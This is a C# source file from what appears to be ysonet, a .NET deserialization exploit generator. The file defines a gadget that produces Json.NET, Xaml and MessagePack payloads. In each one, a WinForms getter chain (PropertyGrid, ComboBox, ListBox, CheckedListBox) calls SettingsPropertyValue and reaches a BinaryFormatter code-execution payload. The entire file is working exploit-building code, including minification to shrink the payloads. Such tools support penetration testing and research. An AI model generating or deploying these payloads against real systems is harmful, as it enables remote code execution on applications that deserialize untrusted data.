using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Windows.Markup;
using ysonet.Helpers;

namespace ysonet.Generators
{
    public class GetterSettingsPropertyValueGenerator : GenericGenerator
    {
        // Discovery facets (category search only): a WinForms getter chain reaches a
        // BinaryFormatter sink (SettingsPropertyValue). Framework built-in types. WPF
        // is only needed on the Xaml formatter path, not the primary chain, so it is
        // not claimed here. All variants share this capability.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.NestedDeserialization)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // getter-call chain; fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        // SettingsPropertyValue + Getter call gadget
        // SettingsPropertyValue.get_PropertyValue leads to the BinaryFormatter.Deserialize

        // We can deserialize the SettingsPropertyValue with proper member values (like Deserialzed=False and SerializedValue=BinaryFormatter_gadget)
        // and then call the get_PropertyValue with one of the getter-call gadgets:
        // PropertyGrid
        // ComboBox
        // ListBox
        // CheckedListBox

        // It should be possible to use it with the serializers that are able to call the one-arg constructor
        // MessagePack gadget works from version 2.3.75. There is a huge chance that it will also work for older versions after some tweaking.

        private int variant_number = 1; // Default

        public override List<string> SupportedFormatters()
        {
            // The "(N)" suffix is a display-only annotation meaning "this formatter
            // carries N variants". Json.NET and Xaml build all four getter chains; the
            // MessagePack helpers implement variant 1 only (Generate() switches back to
            // 1 and says so), so they stay bare.
            return new List<string> { "Json.NET (4)", "Xaml (4)", "MessagePackTypeless", "MessagePackTypelessLz4" };
        }

        public override string Finders()
        {
            return "Piotr Bazydlo";
        }

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                new GadgetVariant(1, "PropertyGrid getter (default; only option for MessagePack)"),
                new GadgetVariant(2, "ComboBox getter"),
                new GadgetVariant(3, "ListBox getter"),
                new GadgetVariant(4, "CheckedListBox getter")
            };
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Variant number. Variant defines a different getter-call gadget. Choices: \r\n1 (default) - PropertyGrid getter-call gadget, " +
                "\r\n2 - ComboBox getter-call gadget (may execute code twice)" +
                "\r\n3 - ListBox getter-call gadget" +
                "\r\n4 - CheckedListBox getter-call gadget", v => int.TryParse(v, out variant_number) },
            };

            return options;
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Bridged, GadgetTags.GetterChain };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                binaryFormatterPayload = (byte[])new TypeConfuseDelegateGenerator()
                    .GenerateInner("BinaryFormatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);

            string payload = "";

            if (formatter.ToLower().Equals("json.net"))
            {
                string spvPayload = @"{
            '$type':'System.Configuration.SettingsPropertyValue, System',
            'Name':'test',
            'IsDirty':false,
            'SerializedValue':
                {
                    '$type':'System.Byte[], mscorlib',
                    '$value':'" + b64encoded + @"'
                },
            'Deserialized':false
        }";
                if (variant_number == 2)
                {
                    payload = @"{
    '$type':'System.Windows.Forms.ComboBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':[
        " + spvPayload + @"
    ], 
    'DisplayMember':'PropertyValue',
    'Text':'watever'
}";
                }
                else if (variant_number == 3)
                {
                    payload = @"{
    '$type':'System.Windows.Forms.ListBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':[
        " + spvPayload + @"
    ], 
    'DisplayMember':'PropertyValue',
    'Text':'watever'
}";
                }
                else if (variant_number == 4)
                {
                    payload = @"{
    '$type':'System.Windows.Forms.CheckedListBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':[
        " + spvPayload + @"
    ], 
    'DisplayMember':'PropertyValue',
    'Text':'watever'
}";
                }
                else
                {
                    payload = @"{
    '$type':'System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'SelectedObjects':[
        " + spvPayload + @"
    ]
}";
                }

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = JsonMinifier.Minify(payload, new string[] { "mscorlib" }, null);
                    }
                    else
                    {
                        payload = JsonMinifier.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("xaml"))
            {

                String bfBytes = XamlWriter.Save(binaryFormatterPayload);
                // Declare the System namespace as the DEFAULT on the array element so each byte
                // element can stay the bare <Byte>...</Byte> that XamlWriter emits, instead of
                // repeating an "s:" prefix on every one. That prefix costs 4 bytes per array
                // element (open + close tag); on a payload with thousands of bytes this saves
                // several KB for the price of one extra xmlns on the array. The children resolve
                // to System.Byte via the default namespace; "assembly:" and "s:" (for Type) are
                // still in scope from the SettingsPropertyValue ancestor.
                bfBytes = bfBytes.Replace("<Byte[] xmlns=\"clr-namespace:System;assembly=mscorlib\">", "<assembly:Array Type=\"s:Byte\" xmlns=\"clr-namespace:System;assembly=mscorlib\">");
                bfBytes = bfBytes.Replace("</Byte[]>", "</assembly:Array>");

                if (variant_number == 2)
                {
                    payload = "<ComboBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><ComboBox.Items><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></ComboBox.Items><ComboBox.DisplayMember>PropertyValue</ComboBox.DisplayMember><ComboBox.Text>watever</ComboBox.Text></ComboBox>";
                }
                else if (variant_number == 3)
                {
                    payload = "<ListBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><ListBox.Items><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></ListBox.Items><ListBox.DisplayMember>PropertyValue</ListBox.DisplayMember><ListBox.Text>watever</ListBox.Text></ListBox>";
                }
                else if (variant_number == 4)
                {
                    payload = "<CheckedListBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><CheckedListBox.Items><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></CheckedListBox.Items><CheckedListBox.DisplayMember>PropertyValue</CheckedListBox.DisplayMember><CheckedListBox.Text>watever</CheckedListBox.Text></CheckedListBox>";
                }
                else
                {
                    payload = "<PropertyGrid UseCompatibleTextRendering=\"True\" Location=\"0, 0\" Name=\"\" TabIndex=\"0\" xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><PropertyGrid.SelectedObject><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></PropertyGrid.SelectedObject></PropertyGrid>";
                }

                if (inputArgs.Minify)
                {
                    // Compact minified form. SettingsPropertyValue.Deserialize() accepts the
                    // SerializedValue as a base64 STRING when the owning SettingsProperty has
                    // SerializeAs=Binary: it then runs Convert.FromBase64String followed by
                    // BinaryFormatter.Deserialize internally, reaching the exact same state as
                    // passing a byte[]. That lets us drop the ~1600-element <Byte> array (tens of
                    // KB) and emit one short base64 string instead, cutting the Xaml payload by
                    // ~90% (about 35 KB down to ~3 KB). b64encoded already holds the loose,
                    // minify-shortened BinaryFormatter payload. The template is written with no
                    // wasteful whitespace, so it needs no XmlMinifier pass (and nothing touches
                    // the base64 text). Verified to deserialize and fire under XamlReader.Load for
                    // all four getter variants.
                    string spv =
                        "<sc:SettingsPropertyValue IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\">"
                        + "<x:Arguments><sc:SettingsProperty SerializeAs=\"Binary\"><x:Arguments><s:String>test</s:String></x:Arguments></sc:SettingsProperty></x:Arguments>"
                        + "<sc:SettingsPropertyValue.SerializedValue><s:String>" + b64encoded + "</s:String></sc:SettingsPropertyValue.SerializedValue>"
                        + "</sc:SettingsPropertyValue>";

                    if (variant_number == 2)
                    {
                        payload = "<ComboBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"><ComboBox.Items>" + spv + "</ComboBox.Items><ComboBox.DisplayMember>PropertyValue</ComboBox.DisplayMember><ComboBox.Text>watever</ComboBox.Text></ComboBox>";
                    }
                    else if (variant_number == 3)
                    {
                        payload = "<ListBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"><ListBox.Items>" + spv + "</ListBox.Items><ListBox.DisplayMember>PropertyValue</ListBox.DisplayMember><ListBox.Text>watever</ListBox.Text></ListBox>";
                    }
                    else if (variant_number == 4)
                    {
                        payload = "<CheckedListBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"><CheckedListBox.Items>" + spv + "</CheckedListBox.Items><CheckedListBox.DisplayMember>PropertyValue</CheckedListBox.DisplayMember><CheckedListBox.Text>watever</CheckedListBox.Text></CheckedListBox>";
                    }
                    else
                    {
                        payload = "<PropertyGrid UseCompatibleTextRendering=\"True\" Location=\"0, 0\" Name=\"\" TabIndex=\"0\" xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"><PropertyGrid.SelectedObject>" + spv + "</PropertyGrid.SelectedObject></PropertyGrid>";
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.Xaml_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }

                return payload;
            }
            else if (IsMessagePackTypeless(formatter))
            {
                Console.WriteLine("\r\nThis version of the gadget works for MessagePack >= 2.3.75\r\n");
                if (variant_number != 1)
                {
                    Console.WriteLine("GetterSettingsPropertyValue is implemented only for variant 1 (PropertyGrid getter chain). Switching to variant 1.\r\n");
                    variant_number = 1;
                }
                byte[] serializedData = BuildMessagePackTypeless(
                    binaryFormatterPayload,
                    IsMessagePackLz4(formatter));

                if (inputArgs.Test)
                {
                    try
                    {
                        MessagePackTypelessTypeSwap.Deserialize(serializedData, IsMessagePackLz4(formatter));
                    }
                    catch { }
                }
                return serializedData;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }

        // The MessagePack Typeless encoding of variant 1 (the PropertyGrid getter chain).
        // Building the real graph would run the getter inside ysonet, so serialize the
        // surrogate graph below and have MessagePack write the two framework type names
        // instead of the surrogate ones. MessagePack >= 2.3.75.
        private static byte[] BuildMessagePackTypeless(byte[] binaryFormatterPayload, bool useLz4)
        {
            var graph = new PropertyGridSurrogate
            {
                SelectedObjects = new object[]
                {
                    new SettingsPropertyValueSurrogate
                    {
                        Deserialized = false,
                        SerializedValue = binaryFormatterPayload
                    }
                }
            };

            var targetTypeNames = new Dictionary<Type, string>
            {
                {
                    typeof(SettingsPropertyValueSurrogate),
                    "System.Configuration.SettingsPropertyValue, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"
                },
                {
                    typeof(PropertyGridSurrogate),
                    "System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"
                }
            };

            return MessagePackTypelessTypeSwap.SerializeAs(graph, targetTypeNames, useLz4);
        }

        // Shape only, never deserialized as itself: MessagePackTypelessTypeSwap rewrites each
        // type name to the framework type in the map above before the payload leaves ysonet.
        // Every public property is written, so the member list must match the real target's
        // (including the unset `property`, which the getter chain expects to see).
        internal sealed class SettingsPropertyValueSurrogate
        {
            public bool Deserialized { get; set; }
            public object SerializedValue { get; set; }
            public object property { get; set; }
        }

        internal sealed class PropertyGridSurrogate
        {
            public object[] SelectedObjects { get; set; }
        }
    }

}
